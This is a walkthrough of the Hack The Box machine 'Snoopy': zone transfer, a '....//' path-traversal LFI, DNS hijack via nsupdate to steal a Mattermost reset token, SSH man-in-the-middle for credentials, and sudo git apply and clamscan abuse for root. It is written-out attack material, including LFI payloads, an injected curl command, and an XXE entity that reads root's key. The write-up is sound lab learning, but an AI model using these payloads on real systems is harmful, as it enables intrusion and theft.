---
layout: post
title: "HTB: Snoopy"
subtitle: "zone transfer plus path-traversal LFI to the rndc key, DNS hijack into a Mattermost password reset, SSH MITM for creds, then git apply and clamscan for root"
date: 2023-07-14
tags: [htb, linux, dns, lfi, ssh-mitm, sudo]
category: writeups
kind: machine
tldr: "A BIND zone transfer and a preg_replace path-traversal LFI gave me the rndc TSIG key. I used nsupdate to repoint mail.snoopy.htb at my box, caught a Mattermost reset token over a debug SMTP server, and reset sbrown. A /server_provision command triggered an outbound SSH that I MITM'd for cbrown creds. cbrown -> sbrown via sudo git apply of a crafted diff, sbrown -> root via sudo clamscan file read."
---

## the box

Snoopy is a hard Linux box that chains a long list of small abuses of legitimate functionality, no single big exploit. The front door is a corporate template site for `snoopy.htb` on nginx. Behind it sits a BIND server I could both transfer the zone from and, once I had the rndc key, push dynamic updates to. That update primitive let me hijack the mailserver record and steal a Mattermost password reset. From Mattermost a provisioning slash command made the box SSH out to an address I controlled, which I sat in the middle of for credentials. The privesc was two narrow `sudo` grants, `git apply` as one user and `clamscan` as root, each turned into write or read of another account's files.

The target was `10.10.11.212` (the notes captured one lab spin at `10.129.84.147`; I use `10.10.11.212` throughout, and my tun0 was `10.10.16.4`).

## recon

I started with a full TCP sweep at a high packet rate, then a service/version scan on only the ports that answered.

```bash
nmap -p- --min-rate 10000 10.10.11.212
nmap -p 22,53,80 -sCV 10.10.11.212
```

Three ports answered:

```
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp open  tcpwrapped
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http       nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

DNS on `53` is the unusual part for a web box, and the `dns-nsid` script leaked `bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu`. The OpenSSH and nginx versions match a clean Ubuntu 22.04 install. I added `snoopy.htb` to `/etc/hosts` and loaded the site over port `80`.

```
10.10.11.212  snoopy.htb
```

It is the SnoopySec bootstrap template, a corporate page with a team listing that leaks employee names and emails:

```
Charles Schultz   Chief Executive Officer   cschultz@snoopy.htb
Sally Brown        Product Manager           sbrown@snoopy.htb
Harold Angel       CTO                       hangel@snoopy.htb
Lucy Van Pelt      Accountant                lpelt@snoopy.htb
```

A contact email `info@snoopy.htb` showed in the page footer too. One banner on the page mattered later:

```
Attention: As we migrate DNS records to our new domain please be advised
that our mailserver 'mail.snoopy.htb' is currently offline
```

So there is a `mail.snoopy.htb` host that does not currently resolve. I confirmed the box agrees it is missing:

```bash
dig any mail.snoopy.htb @10.10.11.212
```

```
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 16341
;; QUESTION SECTION:
;mail.snoopy.htb.		IN	ANY
;; AUTHORITY SECTION:
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 ...
```

`NXDOMAIN` for `mail.snoopy.htb`, served straight from the SOA authority. The box is authoritative for the zone and that record genuinely does not exist. Hold that thought, it becomes the foothold.

Directory busting the web root found three paths, including a `/download` endpoint serving an 11 MB blob.

```bash
feroxbuster -u http://snoopy.htb -x php,html -C 400,502 --no-recursion
```

```
/assets    (Status: 301) [Size: 178] [--> http://snoopy.htb/assets/]
/download  (Status: 200) [Size: 11363570]
/forms     (Status: 301) [Size: 178] [--> http://snoopy.htb/forms/]
```

`/download` is a press-package download, normally hit as `/download?file=announcement.pdf`. The `file` parameter is the interesting one.

Fuzzing virtual hosts turned up a Mattermost instance:

```bash
ffuf -u http://10.10.11.212 -H "Host: FUZZ.snoopy.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

`mm.snoopy.htb` responded (and `mattermost.snoopy.htb` later showed in the zone). I added them to `/etc/hosts`.

### zone transfer

With BIND authoritative for the zone, the first thing to try is an unrestricted AXFR. The named config later showed `allow-transfer { 10.0.0.0/8; }`, but the HTB VPN puts my tun0 inside that range, so the transfer worked:

```bash
dig axfr snoopy.htb @10.10.11.212
```

```
snoopy.htb.             86400  IN  SOA  ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400  IN  NS   ns1.snoopy.htb.
snoopy.htb.             86400  IN  NS   ns2.snoopy.htb.
mattermost.snoopy.htb.  86400  IN  A    172.18.0.3
mm.snoopy.htb.          86400  IN  A    127.0.0.1
ns1.snoopy.htb.         86400  IN  A    10.0.50.10
ns2.snoopy.htb.         86400  IN  A    10.0.51.10
postgres.snoopy.htb.    86400  IN  A    172.18.0.2
provisions.snoopy.htb.  86400  IN  A    172.18.0.4
www.snoopy.htb.         86400  IN  A    127.0.0.1
```

The `172.18.0.0/16` addresses are Docker internal hosts: a Mattermost container at `172.18.0.3`, a postgres backend at `172.18.0.2`, and a `provisions` service at `172.18.0.4`. `mm.snoopy.htb` and `www.snoopy.htb` both point at `127.0.0.1`, so they are served by the same nginx. `mail.snoopy.htb` is missing entirely from the zone, which lines up with both the "mailserver offline" banner and the `NXDOMAIN` above.

### path-traversal LFI

The `/download` endpoint takes a `file` parameter, which it normally uses to bundle a press file into a zip. I fuzzed it for traversal:

```bash
ffuf -u "http://snoopy.htb/download?file=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac
```

A doubled-up traversal hit. The filter strips `../` with a single non-recursive `preg_replace`, so `....//` collapses back to `../` after exactly one pass:

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

That returned a zip containing `/etc/passwd`. I just stacked enough `....//` segments to climb out of the press directory regardless of depth. The real users:

```
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

The `clamav` user and an `_laurel` audit-logging account also showed, both hints at what is running on the box. I read the nginx default site config next:

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....//etc/nginx/sites-available/default
```

The relevant block confirmed `/download` aliases to `download.php` over php8.1-fpm:

```nginx
location ~ ^/download$ {
        alias /var/www/html/download.php;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $request_filename;
        include fastcgi_params;
}
```

So I pulled the PHP source:

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//var/www/html/download.php
```

```php
<?php
$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
}
...
$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
readfile($archive);
unlink($archive);
?>
```

The bug is right there. `preg_replace('/\.\.\//', '', $file)` runs once over the whole string. Given `....//`, it finds the inner `../` and removes it, leaving `../`. There is no loop, so a single pass cannot fully clean a payload built to survive one substitution. The result is prefixed with `press_package/` and added to the zip, so any file readable by `www-data` comes back inside `press_release.zip`. To automate it I just walked the parameter and unzipped the first entry of each response:

```python
import requests, zipfile
from io import BytesIO
def read(fpath):
    p = "....//" * 12 + fpath.lstrip("/")
    r = requests.get(f"http://snoopy.htb/download?file={p}")
    z = zipfile.ZipFile(BytesIO(r.content))
    return z.open(z.namelist()[0]).read()
```

## foothold

The LFI read `/etc/bind/named.conf`, which carried the rndc TSIG key, and `named.conf.local`, which showed the zone allows dynamic updates signed with that key:

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//etc/bind/named.conf
http://snoopy.htb/download?file=....//....//....//....//....//....//....//etc/bind/named.conf.local
```

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```

`allow-update { key "rndc-key"; }` plus the secret means I can add or rewrite records in the zone over the network, signed with the TSIG key. The plan wrote itself: the mailserver record is missing, the banner says it is "offline," and Mattermost will email a password reset when I ask for one. Create `mail.snoopy.htb` pointing at my box, catch the reset mail, take over the account.

I started a debug SMTP server to catch whatever Mattermost sends. Port `25` needs root to bind:

```bash
sudo python3 -m smtpd -n -c DebuggingServer 10.10.16.4:25
```

(The newer equivalent is `sudo python3 -m aiosmtpd -n -l 10.10.16.4:25` since `smtpd` is deprecated; both just print the message body to the console.)

Then I added the record with `nsupdate`, passing the TSIG key inline:

```bash
nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="
> server 10.10.11.212
> update add mail.snoopy.htb. 900 IN A 10.10.16.4
> send
```

The same works from a file with a key file: write `rndc.key` with the `key "rndc-key" { ... }` block and an update script, then `nsupdate -k rndc.key script.txt` where `script.txt` holds `server 10.10.11.212` / `zone snoopy.htb` / `update add mail.snoopy.htb 86400 IN A 10.10.16.4` / `send`. Either way, `dig mail.snoopy.htb @10.10.11.212` now answers with my IP, so the box's mail for that host comes to my SMTP listener.

On `mm.snoopy.htb` I requested a password reset for `sbrown@snoopy.htb`. The reset mail landed in my SMTP console, quoted-printable encoded:

```
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dzean7='
b'dgi358ph8mqpogpwt3epcnrq5hhbcj6wu3czw8wnokwes9xi1wgybj74qtu )'
```

Quoted-printable uses `=3D` for a literal `=` and a trailing `=` as a soft line break, so the real token is the middle stripped of both artifacts. My first caught reset failed because I pasted the link straight out of the email with the encoding intact; once I decoded `=3D` to `=` and dropped the line-break `=`, the link worked:

```
http://mm.snoopy.htb/reset_password_complete?token=zean7dgi358ph8mqpogpwt3epcnrq5hhbcj6wu3czw8wnokwes9xi1wgybj74qtu
```

That page set a new password for sbrown (I used `sbrownsbrown`) and logged me into Mattermost.

## user

Inside Mattermost I read through the channels for anything useful. There was no Mattermost CVE in play and nothing dropped in conversation. The interesting artifact was a slash command, `/server_provision`, which asks for an email, a department, an OS, and a server IP. Supplying values made the box reach out to the IP I gave. I filled it like this:

```
email: sbrown@snoopy.htb
department: engineering
os: linux
server ip: 10.10.16.4
```

A plain listener only showed a paramiko SSH banner, no shell, no callback:

```bash
rlwrap nc -lvnp 2222
```

```
Connection from 10.10.11.212:60582
SSH-2.0-paramiko_3.1.0
```

So the provisioning service SSHes outward to whatever address I hand it. I tried command injection in the server IP field (`10.10.16.4; curl http://10.10.16.4`) and got nothing back but more SSH banners, so the field is not shelling out, it is feeding a paramiko client that connects to me.

That client authenticates to me, which means if I terminate the SSH session at my end and proxy it onward to the real box, I read its credentials in the clear. I used `ssh-mitm` for exactly that, pointing `/server_provision` at my listener on `2222` and relaying to the box on `22`:

```bash
python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222
```

`--enable-trivial-auth` lets the client through even though it cannot verify the host key, and the proxy logs the plaintext auth it relays to the real host. After re-running `/server_provision` against `10.10.16.4:2222`:

```
INFO Remote authentication succeeded
        Remote Address: 10.10.11.212:22
        Username: cbrown
        Password: sn00pedcr3dential!!!
        Agent: no agent
INFO got ssh command: ls -la
```

The provisioning bot logs in as `cbrown` and even runs `ls -la`. Those creds work over real SSH:

```bash
ssh cbrown@10.10.11.212
# sn00pedcr3dential!!!
```

## root

### cbrown -> sbrown via sudo git apply

cbrown's sudo rule allowed running `git apply` as sbrown:

```bash
sudo -l
```

```
User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```

`git apply` writes files as the user it runs as, so anything it creates lands owned by sbrown. There are two ways to abuse it.

The intended route is CVE-2023-23946, a path-traversal in `git apply` where a patch first renames a tracked symlink and then writes a new file through the renamed path, so the write escapes the repo into wherever the symlink pointed. The setup builds a git repo whose tracked entry is a symlink to sbrown's `.ssh` directory:

```bash
mkdir /dev/shm/ssh && cd /dev/shm/ssh
git init
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"
chmod 777 /dev/shm/ssh
```

The patch renames `symlink` to `renamed-symlink`, then adds `authorized_keys` under it, which resolves to `/home/sbrown/.ssh/authorized_keys`:

```diff
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-ed25519 AAAA...my-pubkey... nobody@nothing
```

```bash
sudo -u sbrown /usr/bin/git apply -v patch
ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
```

The simpler path, and the one I used, leans on the same fact that `git apply` runs as sbrown and that I can just hand it a normal diff that writes sbrown's `authorized_keys`. I generated a diff from cbrown's files, rewrote the paths to target sbrown's home, and inserted my public key:

```bash
cd /home
git diff cbrown/.bash_history cbrown/.ssh/authorized_keys > /tmp/diff
# edit /tmp/diff: rewrite every cbrown -> sbrown, drop my pubkey into the added authorized_keys hunk
chmod 777 /home/cbrown
sudo -u sbrown /usr/bin/git apply /tmp/diff
```

A post-patch git build also accepts `git apply --unsafe-paths --directory /home/sbrown/.ssh test.diff`, which writes the target file directly without the symlink rename. Either way I land an SSH key in sbrown's account and log in for the user flag:

```bash
ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
```

### sbrown -> root via sudo clamscan

sbrown had a clean NOPASSWD rule for clamscan:

```bash
sudo -l
```

```
User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan
```

The intended root step is CVE-2023-20052, an XXE in ClamAV's DMG file parser. A crafted DMG with a plist external entity pointing at a target file leaks that file into `clamscan --debug` output. The public PoC builds the malicious image in a container:

```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052 && docker build -t cve-2023-20052 .
docker run -v $(pwd):/exploit -it cve-2023-20052 bash
# inside: genisoimage -> dmg, then inject the entity
#   <!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">]>
#   ... &xxe; into a blkx block
```

```bash
sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg | grep "text value"
# leaks root's private key out of the debug parser output
```

The unintended path, which I took, is the `-f` flag. `clamscan -f <file>` treats the file as a list of paths to scan, and it echoes each line it reads back into its own output as a "No such file or directory" entry. That turns it into an arbitrary root file read:

```bash
sudo /usr/local/bin/clamscan -f /root/root.txt
```

```
LibClamAV Warning: ***  The virus database is older than 7 days!  ***
Loading:    25s, ETA:   0s [========================>]    8.66M/8.66M sigs
Compiling:   5s, ETA:   0s [========================>]       41/41 tasks

<root flag>: No such file or directory
WARNING: <root flag>: Can't access file
```

The line it could not "access" is the flag content, printed straight out of root-readable `/root/root.txt`. The same trick reads root's SSH private key (`sudo clamscan -f /root/.ssh/id_rsa`) for a full interactive shell.

## takeaway

Every step here is a misuse of legitimate functionality, not a single CVE. A permissive zone transfer leaked the internal topology, a non-recursive `preg_replace` filter that runs once handed over the TSIG key, dynamic DNS plus an attacker-pointed mailserver hijacked a reset flow, and an SSH MITM turned an outbound provisioning connection into credentials. The privesc is two GTFOBins-style `sudo` entries: `git apply` writes as the target user, and `clamscan -f` reads as root. The intended CVEs (the `git apply` symlink traversal and the ClamAV DMG XXE) are the "designed" routes, but both grants are dangerous on their own without any CVE at all.
